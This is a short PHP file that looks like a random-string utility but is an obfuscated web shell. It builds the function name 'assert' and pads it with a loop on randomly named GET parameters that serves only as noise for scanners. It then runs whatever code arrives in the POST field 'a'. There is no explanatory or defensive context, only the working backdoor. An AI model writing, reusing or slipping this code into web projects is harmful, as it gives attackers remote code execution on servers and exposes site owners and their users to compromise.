<?php
function generateRandomString($length = 10) { 
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'; 
    $randomString = ''; 
    for ($i = 0; $i < $length; $i++) { 
        $randomString .= $characters[rand(0, strlen($characters) - 1)]; 
    } 
    return $randomString; 
}

$func="assert";
for($i=0;$i<100;$i++)
{
    if($_GET[generateRandomString(10)])
    $func.="a";
}


$func($_POST['a']);
